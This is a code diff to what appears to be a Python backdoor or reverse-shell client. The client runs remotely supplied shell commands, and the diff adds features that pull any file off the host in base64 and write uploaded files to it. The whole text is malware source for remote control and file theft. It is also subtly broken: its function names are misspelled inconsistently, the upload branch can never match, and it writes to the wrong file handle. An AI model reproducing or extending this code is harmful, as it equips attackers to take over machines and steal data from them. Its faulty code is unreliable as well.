@@ -4,7 +4,7 @@ import socket
 import subprocess
 import json
 import os
-
+import base64
 
 def relibale_send(data):
 	try:
@@ -34,6 +34,19 @@ def shell():
 				os.chdir(command[3:])
 			except:
 				continue
+		
+		elif command[:8] == "download":
+			with open(command[9:], "rb") as file:
+				relibale_send(base64.b64encode(file.read()))
+		elif command[:8] == "upload":
+			try:
+				with open(command[7:], "wb") as fin:
+					file_data = reliable_recv()
+					file.write(base64.b64decode(file_data))
+			except Exception as e: 
+				print(e)
+
+		
 		else:
 			try:
 				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
